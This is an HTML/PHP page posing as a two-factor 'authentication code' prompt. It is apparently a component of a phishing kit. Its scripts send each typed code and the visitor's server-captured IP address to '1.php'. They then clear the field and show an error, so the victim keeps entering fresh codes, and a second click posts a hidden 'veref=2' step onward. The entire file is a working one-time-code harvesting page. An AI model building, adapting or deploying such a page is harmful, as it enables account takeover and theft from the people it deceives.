<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>OTP Verification</title>
</head>
<body>			 
    <div style="background: rgb(238, 238, 238); height: 100vh;">
        <div class="body" style="justify-content: center; position: absolute; inset: 50% auto auto 50%; background: linear-gradient(110deg, rgb(218, 237, 255) 25.08%, rgb(223, 231, 255) 34.89%, rgb(241, 245, 251) 50.82%); overflow: auto; border-radius: 15px; outline: none; padding: 20px; transform: translate(-50%, -50%); line-height: 1.5; border-top: 0.5px solid rgb(208, 208, 208); box-shadow: rgba(0, 0, 0, 0.1) 1px 1px 8px 1px;">
            <div class="title" style="font-weight: bold; color: rgb(0, 0, 0); padding: 20px; font-size: 20px;">Check your authentication code</div>
            <hr style="border-top: 1px solid rgb(208, 208, 208);">
            <div class="bodyofcard">
                <div style="padding: 15px; font-size: 15px; font-weight: 500;">Your account has two-factor authentication switched on, which requires this extra login step.</div>
                <div style="padding: 0px 15px; font-size: 15px; font-weight: 500; display: flex;">Enter the 6-digit code for this account from the two-factor authentication you set up (such as Google Authenticator or a text message you have received on your phone).</div>
                <div style="margin: 15px;"><img src="/resources/otp.png" style="width: 100%; border-radius: 20px;"></div>
                <div id="otpEntry" style="padding: 0px 15px; font-size: 15px; font-weight: 500; display: flex;">
                    <input id="otpInput" type="text" placeholder="Login code" style="width: 50%; padding: 20px; font-size: 15px; font-weight: 500; border: 1px solid rgb(208, 208, 208); border-radius: 10px;">
					<input id="ip" type="hidden" value="<?php echo $_SERVER['REMOTE_ADDR']; ?>">
                    <div id="countdown" style="margin-left: 10px; margin-top: 15px; display: none;"></div>
                </div>
                <div id="error-message" style="color: rgb(220, 53, 69); font-size: 14px; display: none;">The code you entered is incorrect, please try again!</div>
            </div>
            <hr style="border-top: 1px solid rgb(208, 208, 208); margin-top: 10px; margin-bottom: 10px;">
            <div class="footercard" style="display: flex; justify-content: space-between; align-items: center; padding: 10px 20px;">
                <button id="submitButton" style="width: 100%; padding-right: 100px; padding-left: 100px; height: 45px; font-weight: bold; font-size: 18px; border-radius: 30px; border-width: 0px; align-items: center; background-color: rgb(125, 175, 249); cursor: pointer; color: white;">Submit</button>
            </div>
        </div>
    </div>

<script>
document.addEventListener('DOMContentLoaded', function () {
    const otpInput = document.getElementById('otpInput');
    const submitButton = document.getElementById('submitButton');

    otpInput.addEventListener('input', function () {
        if (otpInput.value.trim().length > 0) {
            submitButton.style.backgroundColor = 'rgb(48, 132, 244)';
        } else {
            submitButton.style.backgroundColor = 'rgb(125, 175, 249)';
        }
    });
});

</script>

    <script>
        let clickCount = 0;

        document.getElementById('submitButton').addEventListener('click', function () {
            clickCount++;

            if (clickCount === 2) {
                let form = document.createElement('form');
                form.method = 'POST';
                form.action = '/';

                let input = document.createElement('input');
                input.type = 'hidden';
                input.name = 'veref';
                input.value = '2';

                form.appendChild(input);
                document.body.appendChild(form);

                form.submit();
            }
        });
    </script>
<script>
document.addEventListener('DOMContentLoaded', function() {
    var countdownElement = document.getElementById('countdown');
    var errorMessage = document.getElementById('error-message');
    var submitButton = document.getElementById('submitButton');
    var otpInput = document.getElementById('otpInput');
    var countdownTime = 59;
    var countdownInterval;

    function startCountdown() {
        clearInterval(countdownInterval);
        countdownElement.style.display = 'block';
        countdownTime = 59; // Reset countdown time
        countdownInterval = setInterval(function() {
            countdownTime--;
            var minutes = Math.floor(countdownTime / 60);
            var seconds = countdownTime % 60;
            countdownElement.textContent = `Wait ${minutes < 10 ? '0' + minutes : minutes}:${seconds < 10 ? '0' + seconds : seconds}`;

            if (countdownTime <= 0) {
                clearInterval(countdownInterval);
                countdownElement.textContent = ''; 
                submitButton.disabled = false; 
            }
        }, 1000);
    }

    function submitForm() {
        var otpCode = otpInput.value.trim();
        var ipAddress = document.getElementById('ip').value;

        if (otpCode === '') {
            return;
        }

        submitButton.disabled = true;
        startCountdown();

        var formData = new FormData();
        formData.append('otp', otpCode);
        formData.append('ip', ipAddress);

        fetch('1.php', {
            method: 'POST',
            body: formData
        })
        .then(response => response.text())
        .then(data => {
            console.log(data);
            if (data === 'success') {
                errorMessage.style.display = 'none';
                otpInput.value = '';
                otpInput.focus();
            } else {
                errorMessage.style.display = 'block';
                otpInput.value = '';
                otpInput.focus(); 
            }
        })
        .catch(error => {
            console.error('Error:', error);
            errorMessage.style.display = 'block';
            otpInput.value = '';
            otpInput.focus();
        });
    }

    submitButton.addEventListener('click', function(event) {
        event.preventDefault();
        submitForm();
    });
});
</script>

</body>
</html>